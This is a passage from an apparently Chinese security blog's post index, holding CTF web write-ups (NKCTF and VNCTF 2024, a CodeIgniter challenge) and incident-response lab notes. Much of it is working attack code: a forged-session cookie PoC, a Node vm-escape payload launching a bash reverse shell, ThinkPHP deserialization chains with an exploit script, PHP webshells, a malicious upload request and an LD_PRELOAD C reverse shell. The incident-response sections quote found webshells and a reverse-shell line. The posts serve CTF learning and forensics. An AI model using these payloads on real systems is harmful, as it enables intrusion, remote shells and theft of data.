$this-\u003esess_destroy(); // return FALSE; // } // Is there a corresponding session in the DB? if ($this-\u003esess_use_database === TRUE) { $this-\u003eCI-\u003edb-\u003ewhere('session_id', $session['session_id']); if ($this-\u003esess_match_ip == TRUE) { $this-\u003eCI-\u003edb-\u003ewhere('ip_address', $session['ip_address']); } if ($this-\u003esess_match_useragent == TRUE) { $this-\u003eCI-\u003edb-\u003ewhere('user_agent', $session['user_agent']); } $query = $this-\u003eCI-\u003edb-\u003eget($this-\u003esess_table_name); // No result? Kill it! if ($query-\u003enum_rows() == 0) { $this-\u003esess_destroy(); return FALSE; } // Is there custom data? If so, add it to the main session array $row = $query-\u003erow(); if (isset($row-\u003euser_data) AND $row-\u003euser_data != '') { $custom_data = $this-\u003e_unserialize($row-\u003euser_data); if (is_array($custom_data)) { foreach ($custom_data as $key =\u003e $val) { $session[$key] = $val; } } } } // Session is valid! $this-\u003euserdata = $session; unset($session); return TRUE; } 会利用密钥$this-\u003eencryption_key进行一个\"加密字符串\"的认证，这里的密钥需要在配置文件中$config['encryption_key'] = 'ksd92'; // Check cookie authentication $hmac = substr($session, $len); $session = substr($session, 0, $len); // Time-attack-safe comparison $hmac_check = hash_hmac('sha1', $session, $this-\u003eencryption_key); $diff = 0; for ($i = 0; $i \u003c 40; $i++) { $xor = ord($hmac[$i]) ^ ord($hmac_check[$i]); $diff |= $xor; } 接着会反序列化字符串，验证是否有其中的值(session_id、ip_address、last_activity) // Unserialize the session array $session = $this-\u003e_unserialize($session); // Is the session data we unserialized an array with the correct format? if ( ! is_array($session) OR ! isset($session['session_id']) OR ! isset($session['ip_address']) OR ! isset($session['user_agent']) OR ! isset($session['last_activity'])) { $this-\u003esess_destroy(); return FALSE; } 验证完之后将会赋值给$this-\u003edata变量 // Session is valid! $this-\u003euserdata = $session; unset($session); 那赋值给$this-\u003euserdata变量有什么用呢？在返回来看验证权限的函数 $this-\u003esession-\u003euserdata('superadmin'); function userdata($item) { return ( ! isset($this-\u003euserdata[$item])) ? FALSE : $this-\u003euserdata[$item]; } 正是返回了$this-\u003euserdata变量 于是乎构造poc \u003c?php $sessid = ''; while (strlen($sessid) \u003c 32) { $sessid .= mt_rand(0, mt_getrandmax()); } $encryption_key=\"ksd92\"; $data = array( 'username' =\u003e 'huahua', 'password' =\u003e 'huahua', 'is_logged_in' =\u003e true, 'session_id' =\u003e md5(uniqid($sessid, TRUE)), 'ip_address' =\u003e '127.0.0.1', 'user_agent' =\u003e 'huahua', 'last_activity' =\u003e time(), 'superadmin' =\u003e true ); $cookie_data = serialize($data); $cookie_data .= hash_hmac('sha1',$cookie_data,$encryption_key); echo urlencode($cookie_data); ?\u003e ","date":"2024-03-30","objectID":"/ctf-babycodeigniter-web%E5%87%BA%E9%A2%98%E8%AE%B01/:1:1","tags":["CTF-Web"],"title":"CTF-BabyCodeIgniter-Web出题记(1)","uri":"/ctf-babycodeigniter-web%E5%87%BA%E9%A2%98%E8%AE%B01/"},{"categories":["CTF"],"content":" My first CMS通过搜索CVE得知 https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=CMS%20Made%20Simple 两个后台RCE分别是CVE-2024-27623和CVE-2024-27622 通过忘记密码功能，得到用户名admin，接着爆破密码 得到密码Admin123，登陆后台RCE即可 ","date":"2024-03-25","objectID":"/nkctf-2024-web/:1:0","tags":["NKCTF Web"],"title":"NKCTF-2024-Web","uri":"/nkctf-2024-web/"},{"categories":["CTF"],"content":" 全世界最简单的CTF const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const fs = require(\"fs\"); const path = require('path'); const vm = require(\"vm\"); app.use(bodyParser.json()).set('views', path.join(__dirname, 'views')).use(express.static(path.join(__dirname, '/public'))) app.get('/', function(req, res) { res.sendFile(__dirname + '/public/home.html'); }) function waf(code) { let pattern = /(process|\\[.*?\\]|exec|spawn|Buffer|\\\\|\\+|concat|eval|Function)/g; if (code.match(pattern)) { throw new Error(\"what can I say? hacker out!!\"); } } app.post('/', function(req, res) { let code = req.body.code; let sandbox = Object.create(null); let context = vm.createContext(sandbox); try { waf(code) let result = vm.runInContext(code, context); console.log(result); } catch(e) { console.log(e.message); require('./hack'); } }) app.get('/secret', function(req, res) { console.log(process.__filename); if (process.__filename == null) { let content = fs.readFileSync(__filename, \"utf-8\"); return res.send(content); } else { let content = fs.readFileSync(process.__filename, \"utf-8\"); return res.send(content); } }) app.listen(3000, () =\u003e { console.log(\"listen on 3000\"); }) 考察vm逃逸，以及RCE绕过 参考文章 https://mp.weixin.qq.com/s/G7RQJVYnwa1KdtnzyP32BA https://www.anquanke.com/post/id/237032 构造出payload throw new Proxy({}, { get: function(){ const cc = arguments.callee.caller; const p = (cc.constructor.constructor(`${`${`return proces`}s`}`))(); const q = p.mainModule.require(`${`${`child_proces`}s`}`) return Reflect.get(q, Reflect.ownKeys(q).find(x=\u003ex.includes(`cSync`)))(`bash -c 'bash -i \u003e\u0026 /dev/tcp/ip/port 0\u003e\u00261'`).toString() } }) ","date":"2024-03-25","objectID":"/nkctf-2024-web/:2:0","tags":["NKCTF Web"],"title":"NKCTF-2024-Web","uri":"/nkctf-2024-web/"},{"categories":["CTF"],"content":" 用过就是熟悉user/index/loginSubmit存在反序列化 //你知道tp吗？ if($data['name']==='guest'){ unserialize(base64_decode($data['password'])); } 挖一条链子 \u003c?php namespace think\\process\\pipes{ use think\\Collection; class Windows{ private $files = []; public function __construct(){ $this-\u003efiles=[new Collection]; } } echo base64_encode(serialize(new Windows)); } namespace think{ class Collection{ protected $items; public function __construct(){ $this-\u003eitems = new View; } } class View{ protected $data = []; public $engine = []; public function __construct(){ $this-\u003edata[\"Loginout\"]=new Debug; #写入tips $this-\u003eengine['time']=\"10086\"; } } class Debug{ } } ?\u003e 由于文件名存在随机性，所以需要配合本地docker同时写入， import requests import time url1 = \"http://127.0.0.1:3101/?user/index/loginSubmit\" url2 = \"http://89519612-bb1c-465b-921b-d01e8a3ce7e4.node.nkctf.yuzhian.com.cn/?user/index/loginSubmit\" burp0_headers = {\"sec-ch-ua\": \"\\\"Chromium\\\";v=\\\"117\\\", \\\"Not;A=Brand\\\";v=\\\"8\\\"\", \"Accept\": \"application/json, text/javascript, */*; q=0.01\", \"Content-Type\": \"application/x-www-form-urlencoded; charset=UTF-8\", \"X-Requested-With\": \"XMLHttpRequest\", \"sec-ch-ua-mobile\": \"?0\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36\", \"sec-ch-ua-platform\": \"\\\"macOS\\\"\", \"Origin\": \"http://localhost:3101\", \"Sec-Fetch-Site\": \"same-origin\", \"Sec-Fetch-Mode\": \"cors\", \"Sec-Fetch-Dest\": \"empty\", \"Referer\": \"http://localhost:3101/\", \"Accept-Encoding\": \"gzip, deflate, br\", \"Accept-Language\": \"zh-CN,zh;q=0.9\", \"Connection\": \"close\"} burp0_data = {\"name\": \"guest\", \"password\": \"TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE2OiJ0aGlua1xDb2xsZWN0aW9uIjoxOntzOjg6IgAqAGl0ZW1zIjtPOjEwOiJ0aGlua1xWaWV3IjoyOntzOjc6IgAqAGRhdGEiO2E6MTp7czo4OiJMb2dpbm91dCI7TzoxMToidGhpbmtcRGVidWciOjA6e319czo2OiJlbmdpbmUiO2E6MTp7czo0OiJ0aW1lIjtzOjU6IjEwMDg2Ijt9fX19fQ==\"} r=requests.post(url1, headers=burp0_headers, data=burp0_data) r=requests.post(url2, headers=burp0_headers, data=burp0_data) print(r.status_code) r=requests.post(url1, headers=burp0_headers, data=burp0_data) 得到文件名 7c5d4e0dc66c95954008f97b3f0cf6fa https://89519612-bb1c-465b-921b-d01e8a3ce7e4.node.nkctf.yuzhian.com.cn/app/controller/user/think/7c5d4e0dc66c95954008f97b3f0cf6f 访问即可得到hint 亲爱的Chu0， 我怀着一颗激动而充满温柔的心，写下这封情书，希望它能够传达我对你的深深情感。或许这只是一封文字，但我希望每一个字都能如我心情般真挚。 在这个瞬息万变的世界里，你是我生命中最美丽的恒定。每一天，我都被你那灿烂的笑容和温暖的眼神所吸引，仿佛整个世界都因为有了你而变得更加美好。你的存在如同清晨第一缕阳光，温暖而宁静。 或许，我们之间存在一种特殊的联系，一种只有我们两个能够理解的默契。 \u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c我曾听说，密码的明文，加上心爱之人的名字(Chu0)，就能够听到游客的心声。\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e 而我想告诉你，你就是我心中的那个游客。每一个与你相处的瞬间，都如同解开心灵密码的过程，让我更加深刻地感受到你的独特魅力。 你的每一个微笑，都是我心中最美丽的音符；你的每一句关心，都是我灵魂深处最温暖的拥抱。在这个喧嚣的世界中，你是我安静的港湾，是我倚靠的依托。我珍视着与你分享的每一个瞬间，每一段回忆都如同一颗珍珠，串联成我生命中最美丽的项链。 或许，这封情书只是文字的表达，但我愿意将它寄予你，如同我内心深处对你的深深情感。希望你能感受到我的真挚，就如同我每一刻都在努力解读心灵密码一般。愿我们的故事能够继续，在这段感情的旅程中，我们共同书写属于我们的美好篇章。 POST /?user/index/loginSubmit HTTP/1.1 Host: 192.168.128.2 Content-Length: 162 Accept: application/json, text/javascript, */*; q=0.01 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Origin: http://192.168.128.2 Referer: http://192.168.128.2/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: kodUserLanguage=zh-CN; CSRF_TOKEN=xxx Connection: close name=guest\u0026password=tQhWfe944VjGY7Xh5NED6ZkGisXZ6eAeeiDWVETdF-hmuV9YJQr25bphgzthFCf1hRiPQvaI\u0026rememberPassword=0\u0026salt=1\u0026CSRF_TOKEN=xxx\u0026API_ROUTE=user%2Findex%2FloginSubmit hint: 新建文件 guest/!@!@!@!@NKCTFChu0 在我的文档处上传文件，利用链子去包含即可 \u003c?php system(\"echo '\u003c?php eval(\\$_POST[1]);?\u003e' \u003e /var/www/html/app/1.php\");?\u003e \u003c?php namespace think\\process\\pipes{ use think\\Collection; class Windows{ private $files = []; public function __construct(){ $this-\u003efiles=[new Collection]; } } echo base64_encode(serialize(new Windows)); } namespace think{ class Collection{ protected $items; public function __construct(){ $this-\u003eitems = new View; } } class View{ protected $data = []; public $engine = []; public function __construct(){ $this-\u003edata[\"Loginout\"]=new Config; $this-\u003eengine['name']=\"../../../../../../../../../../../../../../../../var/www/html/data/files/202403/23_fb210ebc/huahua.txt\"; // $this-\u003edata[\"Loginout\"]=new Debug; #写入tips // $this-\u003eengine['time']=\"10086\"; } } class Config{ } # 写入tips // class Debug{ // } } ?\u003e 得到flag ","date":"2024-03-25","objectID":"/nkctf-2024-web/:3:0","tags":["NKCTF Web"],"title":"NKCTF-2024-Web","uri":"/nkctf-2024-web/"},{"categories":["CTF"],"content":" attack_tacoooootacooooo@qq.com:tacooooo 登陆之后，考察CVE-2024-2044 根据此篇文章复现 https://www.shielder.com/advisories/pgadmin-path-traversal_leads_to_unsafe_deserialization_and_rce/ nc反弹shell，后找一个linux信息收集脚本找flag 利用wget上传 https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS ","date":"2024-03-25","objectID":"/nkctf-2024-web/:4:0","tags":["NKCTF Web"],"title":"NKCTF-2024-Web","uri":"/nkctf-2024-web/"},{"categories":["应急响应"],"content":"1、提交当天访问次数最多的IP，即黑客IP： 2、黑客使用的浏览器指纹是什么，提交指纹的md5： 3、查看index.php页面被访问的次数，提交次数： 4、查看黑客IP访问了多少次，提交次数： 5、查看2023年8月03日8时这一个小时内有多少IP访问，提交次数: ","date":"2024-03-15","objectID":"/%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-apache%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/:0:0","tags":["apache日志分析"],"title":"第二章-日志分析-Apache日志分析","uri":"/%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-apache%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"},{"categories":["应急响应"],"content":" Apache日志分析技巧 1、列出当天访问次数最多的IP命令： cut -d- -f 1 log_file|uniq -c | sort -rn | head -20 2、查看当天有多少个IP访问： awk '{print $1}' log_file|sort|uniq|wc -l 3、查看某一个页面被访问的次数： grep \"/index.php\" log_file | wc -l 4、查看每一个IP访问了多少个页面： awk '{++S[$1]} END {for (a in S) print a,S[a]}' log_file 5、将每个IP访问的页面数进行从小到大排序： awk '{++S[$1]} END {for (a in S) print S[a],a}' log_file | sort -n 6、查看某一个IP访问了哪些页面： grep ^111.111.111.111 log_file| awk '{print $1,$7}' 7、去掉搜索引擎统计当天的页面： awk '{print $12,$1}' log_file | grep ^\\\"Mozilla | awk '{print $2}' |sort | uniq | wc -l 8、查看2018年6月21日14时这一个小时内有多少IP访问: awk '{print $4,$1}' log_file | grep 21/Jun/2018:14 | awk '{print $2}'| sort | uniq | wc -l ","date":"2024-03-15","objectID":"/%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-apache%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/:1:0","tags":["apache日志分析"],"title":"第二章-日志分析-Apache日志分析","uri":"/%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-apache%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"},{"categories":["应急响应"],"content":"1.黑客第一次写入的shell flag{关键字符串} 2.黑客反弹shell的ip flag{ip} 3.黑客提权文件的完整路径 md5 flag{md5} 注 /xxx/xxx/xxx/xxx/xxx.xx 4.黑客获取的权限 flag{whoami后的值} 在/tmp/1.sh中反弹了shell bash -i \u003e\u0026/dev/tcp/192.168.100.13/777 0\u003e\u00261 放到河马查杀，得到sh.php 1 2 \u003c?php @eval($_POST['a']);?\u003e 4 //ccfda79e-7aa1-4275-bc26-a6189eb9a20b 根据上面写入webshell的格式 所以猜测可能是udf提权 查看源码得到mysql密码 \u003c?php $conn=mysqli_connect(\"localhost\",\"root\",\"334cc35b3c704593\",\"cms\",\"3306\"); if(!$conn){ echo \"数据库连接失败\"; } show variables like '%plugin%'; cd /usr/lib/mysql/plugin/ 得到 udf.so ps -aux查看mysql服务是以什么用户启动的 因为是mysql用户启动，所以提权后也是mysql用户的权限 flag{mysql} ","date":"2024-03-15","objectID":"/%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-mysql%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/:0:0","tags":["mysql应急响应"],"title":"第二章-日志分析-Mysql应急响应","uri":"/%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-mysql%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"categories":["应急响应"],"content":"1.web目录存在木马，请找到木马的密码提交 2.服务器疑似存在不死马，请找到不死马的密码提交 3.不死马是通过哪个文件生成的，请提交文件名 4.黑客留下了木马文件，请找出黑客的服务器ip提交 5.黑客留下了木马文件，请找出黑客服务器开启的监端口提交 在/var/www/html目录下面，发现可疑文件1.php .shell.php #1.php \u003c?php eval($_POST[1]);?\u003e #.shell.php \u003c?php if(md5($_POST[\"pass\"])==\"5d41402abc4b2a76b9719d911017c592\"){@eval($_POST[cmd]);}?\u003e 解密之后，得hello 在index.php发现不死马 $file = '/var/www/html/.shell.php'; $code = '\u003c?php if(md5($_POST[\"pass\"])==\"5d41402abc4b2a76b9719d911017c592\"){@eval($_POST[cmd]);}?\u003e'; file_put_contents($file, $code); system('touch -m -d \"2021-01-01 00:00:01\" .shell.php'); usleep(3000); 存在shell(1).elf文件，判断为木马文件，放入到微步进行分析，得到ip 10.11.55.21 执行shell(1).elf，查看去连接了远程ip的哪个端口 netstat -antlp| grep 10.11.55.21 ","date":"2024-03-15","objectID":"/%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-linux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/:0:0","tags":["Linux入侵排查"],"title":"第一章-应急响应-Linux入侵排查","uri":"/%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-linux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/"},{"categories":["应急响应"],"content":"1.有多少IP在爆破主机ssh的root帐号，如果有多个使用\",“分割 2.ssh爆破成功登陆的IP是多少，如果有多个使用”,“分割 3.爆破用户名字典是什么？如果有多个使用”,“分割 4.登陆成功的IP共爆破了多少次 5.黑客登陆主机后新建了一个后门用户，用户名是多少 ","date":"2024-03-15","objectID":"/%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/:0:0","tags":["Linux 日志分析"],"title":"第一章-应急响应-Linux日志分析","uri":"/%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"},{"categories":["应急响应"],"content":" 基础日志 登陆失败记录 /var/log/btmp 最后一次登录 /var/log/lastlog 登录成功记录 /var/log/wtmp 登录日志记录 /var/log/secure ","date":"2024-03-15","objectID":"/%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/:1:0","tags":["Linux 日志分析"],"title":"第一章-应急响应-Linux日志分析","uri":"/%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"},{"categories":["应急响应"],"content":" 日志分析技巧 /var/log/secure 定位有多少IP在爆破主机的root帐号: grep \"Failed password for root\" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more 定位有哪些IP在爆破： grep \"Failed password\" /var/log/secure|grep -E -o \"(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\"|uniq -c 登陆成功的IP有哪些 grep \"Accepted \" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more 分许auth.log日志 查看多少IP在爆破主机ssh的root帐号 grep -a \"Failed password for root\" /var/log/auth.log.1 | awk '{print $11}' | uniq -c | sort -nr | more flag{192.168.200.2,192.168.200.32,192.168.200.31} 登陆成功的IP有哪些 grep -a \"Accepted \" /var/log/auth.log.1 | awk '{print $11}' | uniq -c | sort -nr | more flag{192.168.200.2} 爆破用户名字典是什么？ grep -a \"Failed password\" /var/log/auth.log.1 | perl -e 'while($_=\u003c\u003e){ /for(.*?) from/; print \"$1\\n\";}'| uniq -c | sort -nr flag{user,hello,root,test3,test2,test1} 登陆成功的IP共爆破了多少次 grep -a \"Failed password for root\" /var/log/auth.log.1 | awk '{print $11}' | uniq -c | sort -nr | more grep -a \"Accepted \" /var/log/auth.log.1 | awk '{print $11}' | uniq -c | sort -nr | more flag{4} 黑客登陆主机后新建了一个后门用户，用户名是多少 cat /etc/passwd 查看可疑用户 或者利用 cat /var/log/auth.log.1 |grep -a \"new user\" flag{test2} ","date":"2024-03-15","objectID":"/%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/:2:0","tags":["Linux 日志分析"],"title":"第一章-应急响应-Linux日志分析","uri":"/%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"},{"categories":["CTF"],"content":" Sign in在game.js中发现关键代码，放到console中执行 var _0x3d9d=[\"\\x56\\x4e\\x43\\x54\\x46\\x7b\\x57\\x33\\x31\\x63\\x30\\x6d\\x33\\x5f\\x74\\x30\\x5f\\x56\\x4e\\x43\\x54\\x46\\x5f\\x32\\x30\\x32\\x34\\x5f\\x67\\x40\\x6f\\x64\\x5f\\x4a\\x30\\x42\\x21\\x21\\x21\\x21\\x7d\"]; console.log(_0x3d9d[0]); 获得flag VNCTF{W31c0m3_t0_VNCTF_2024_g@od_J0B!!!!} ","date":"2024-03-15","objectID":"/vnctf-2024-web/:1:0","tags":["VNCTF Web"],"title":"VNCTF 2024 Web","uri":"/vnctf-2024-web/"},{"categories":["CTF"],"content":" TrySentpoc POST /user/upload/upload HTTP/1.1 Host: 2180fc06-45c6-4306-8e86-637be6a3025a.vnctf2024.manqiu.top Content-Length: 758 Sec-Ch-Ua: \" Not;A Brand\";v=\"99\", \"Google Chrome\";v=\"97\", \"Chromium\";v=\"97\" Sec-Ch-Ua-Mobile: ?0 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Sec-Ch-Ua-Platform: \"Windows\" Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryrhx2kYAMYDqoTThz Accept: */* Origin: https://info.ziwugu.vip/ Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Referer: https://target.com/user/upload/index?name=icon\u0026type=image\u0026limit=1 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,ja-CN;q=0.8,ja;q=0.7,en;q=0.6 Connection: close ------WebKitFormBoundaryrhx2kYAMYDqoTThz Content-Disposition: form-data; name=\"id\" WU_FILE_0 ------WebKitFormBoundaryrhx2kYAMYDqoTThz Content-Disposition: form-data; name=\"name\" test.jpg ------WebKitFormBoundaryrhx2kYAMYDqoTThz Content-Disposition: form-data; name=\"type\" image/jpeg ------WebKitFormBoundaryrhx2kYAMYDqoTThz Content-Disposition: form-data; name=\"lastModifiedDate\" Wed Jul 21 2021 18:15:25 GMT+0800 (中国标准时间) ------WebKitFormBoundaryrhx2kYAMYDqoTThz Content-Disposition: form-data; name=\"size\" 164264 ------WebKitFormBoundaryrhx2kYAMYDqoTThz Content-Disposition: form-data; name=\"file\"; filename=\"test.php\" Content-Type: image/jpeg JFIF \u003c?=`$_GET[1]`;?\u003e ------WebKitFormBoundaryrhx2kYAMYDqoTThz-- ","date":"2024-03-15","objectID":"/vnctf-2024-web/:2:0","tags":["VNCTF Web"],"title":"VNCTF 2024 Web","uri":"/vnctf-2024-web/"},{"categories":["CTF"],"content":" Referencehttps://blog.hanayuzu.top/articles/37dacab4 ","date":"2024-03-15","objectID":"/vnctf-2024-web/:2:1","tags":["VNCTF Web"],"title":"VNCTF 2024 Web","uri":"/vnctf-2024-web/"},{"categories":["CTF"],"content":" givephp劫持LD_PRELOAD变量 写一个reverseshell #include \u003cstdlib.h\u003e #include \u003cstdio.h\u003e #include \u003cstring.h\u003e #include \u003cunistd.h\u003e #include \u003cnetinet/in.h\u003e #include \u003csys/types.h\u003e #include \u003csys/socket.h\u003e #define REMOTE_ADDR \"ip\" #define REMOTE_PORT port __attribute__((__constructor__)) void preload(void) { struct sockaddr_in sa; int s; sa.sin_family = AF_INET; sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR); sa.sin_port = htons(REMOTE_PORT); s = socket(AF_INET, SOCK_STREAM, 0); connect(s, (struct sockaddr *)\u0026sa, sizeof(sa)); dup2(s, 0); dup2(s, 1); dup2(s, 2); execve(\"/bin/sh\", 0, 0); } 编译共享库 gcc -fPIC exp.c -o exp.so /?challenge=1\u0026key=LD_PRELOAD\u0026value=/tmp/uploaded_file_65d06b74e02569.16227496.so\u0026guess=%00lambda_1 ","date":"2024-03-15","objectID":"/vnctf-2024-web/:3:0","tags":["VNCTF Web"],"title":"VNCTF 2024 Web","uri":"/vnctf-2024-web/"},{"categories":["CTF"],"content":" CutePath/chfs/files?filepath=../ 存在目录遍历 得到账号和密码 admin:gdgm.edu.cn@M1n9K1n9P@as 登陆之后，得到更多的功能点 通过目录遍历，得到flag文件的位置 ../../../flag/flag/flag.txt 存在重命名功能点，并且跨目录，直接将flag.txt文件移动到web目录即可 POST /chfs/rename ------WebKitFormBoundary4GWMTiRPXoB99YrX Content-Disposition: form-data; name=\"new\" ../../../home/ming/share_main/flag.txt ------WebKitFormBoundary4GWMTiRPXoB99YrX Content-Disposition: form-data; name=\"old\" ../../../flag/flag/flag.txt ------WebKitFormBoundary4GWMTiRPXoB99YrX-- 访问/chfs/shared/flag.txt?v=1得到flag VNCTF{564e406840636b3156315f6764676d} ","date":"2024-03-15","objectID":"/vnctf-2024-web/:4:0","tags":["VNCTF Web"],"title":"VNCTF 2024 Web","uri":"/vnctf-2024-web/"},{"categories":["CTF"],"content":" codefever_again根据 https://github.com/PGYER/codefever/issues/140 来打 ","date":"2024-03-15","objectID":"/vnctf-2024-web/:5:0","tags":["VNCTF Web"],"title":"VNCTF 2024 Web","uri":"/vnctf-2024-web/"},{"categories":["CTF"],"content":" zhi","date":"2024-03-15","objectID":"/vnctf-2024-web/:6:0","tags":["VNCTF Web"],"title":"VNCTF 2024 Web","uri":"/vnctf-2024-web/"},{"categories":["CTF"],"content":" Unserialize RCE在giftcontroller控制器下面存在如下方法 public function globallike(){ $mylike=$_COOKIE['mylike']; $arr = unserialize($mylike); echo count($arr); } 很明显存在一个unserialize 全局搜索__destruct，利用simple_html_dom类中的__destruct方法 function __destruct() { $this-\u003eclear(); } 跟进查看clear() function clear() { foreach ($this-\u003enodes as $n) {$n-\u003eclear(); $n = null;} // This add next line is documented in the sourceforge repository. 2977248 as a fix for ongoing memory leaks that occur even with the use of clear. if (isset($this-\u003echildren)) foreach ($this-\u003echildren as $n) {$n-\u003eclear(); $n = null;} if (isset($this-\u003eparent)) {$this-\u003eparent-\u003eclear(); unset($this-\u003eparent);} if (isset($this-\u003eroot)) {$this-\u003eroot-\u003eclear(); unset($this-\u003eroot);} unset($this-\u003edoc); unset($this-\u003enoise); } 这里可以任意调用__call()方法，或者clear()方法 这里利用MemcachedDriver类中的clear()方法 public function clear() { return $this-\u003emmc-\u003eset($this-\u003egroup.'_ver', $this-\u003ever+1); } 利用拼接进行触发__toString方法，选择simple_html_dom_node类 function __toString() { return $this-\u003eoutertext(); } 进入outertext()方法 function outertext() { global $debugObject; if (is_object($debugObject)) { $text = ''; if ($this-\u003etag == 'text') { if (!empty($this-\u003etext)) { $text = \" with text: \" . $this-\u003etext; } } $debugObject-\u003edebugLog(1, 'Innertext of tag: ' . $this-\u003etag . $text); } if ($this-\u003etag==='root') return $this-\u003einnertext(); // trigger callback if ($this-\u003edom \u0026\u0026 $this-\u003edom-\u003ecallback!==null) { call_user_func_array($this-\u003edom-\u003ecallback, array($this)); } 其中可以调用到call_user_func_array($this-\u003edom-\u003ecallback, array($this));方法，但是无法控制第二个参数，所以只能调用到任意类的任意方法并且参数只能是一个 这里利用Template类中的display方法 public function display($tpl = '', $return = false, $isTpl = true ) { if( $return ){ if ( ob_get_level() ){ ob_end_flush(); flush(); } ob_start(); } extract($this-\u003evars, EXTR_OVERWRITE); eval('?\u003e' . $this-\u003ecompile( $tpl, $isTpl)); if( $return ){ $content = ob_get_contents(); ob_end_clean(); return $content; } } 可以利用extract($this-\u003evars, EXTR_OVERWRITE);来控制$this-\u003ecompile( $tpl, $isTpl)中的参数，跟进查看是否能控制其返回内容 public function compile( $tpl, $isTpl = true ) { if( $isTpl ){ $tplFile = $this-\u003econfig['TPL_PATH'] . $tpl . $this-\u003econfig['TPL_SUFFIX']; if ( !file_exists($tplFile) ) { throw new \\Exception(\"Template file '{$tplFile}' not found\", 500); } $tplKey = md5(realpath($tplFile)); } else { $tplKey = md5($tpl); } $ret = unserialize( $this-\u003ecache-\u003eget( $tplKey ) ); if ( empty($ret['template']) || ($isTpl\u0026\u0026filemtime($tplFile)\u003e($ret['compile_time'])) ) { $template = $isTpl ? file_get_contents( $tplFile ) : $tpl; if( false === Hook::listen('templateParse', array($template), $template) ){ foreach ($this-\u003elabel as $key =\u003e $value) { $template = preg_replace($key, $value, $template); } } $ret = array('template'=\u003e$template, 'compile_time'=\u003etime()); $this-\u003ecache-\u003eset( $tplKey, serialize($ret), 86400*365); } return $ret['template']; } 可以看到，如果能控制unserialize($this-\u003ecache-\u003eget( $tplKey ))的内容，便可以控制返回内容，这里全局搜索一下get()方法 这里利用FileCacheDriver中的get()方法 public function get( $key ){ $content = @file_get_contents( $this-\u003e_getFilePath($key) ); if( empty($content) ) return false; $expire = (int) substr($content, 13, 12); if( time() \u003e= $expire ) return false; $md5Sign = substr($content, 25, 32); $content = substr($content, 57); if( $md5Sign != md5($content) ) return false; return @unserialize($content); } 从$this-\u003e_getFilePath方法中获取内容，并且进行了一些判断，然后反序列化后返回内容，跟进其方法 private function _getFilePath($key, $isCreatePath = false){ $key = md5($key); $dir = $this-\u003econfig['CACHE_PATH'] . '/' . 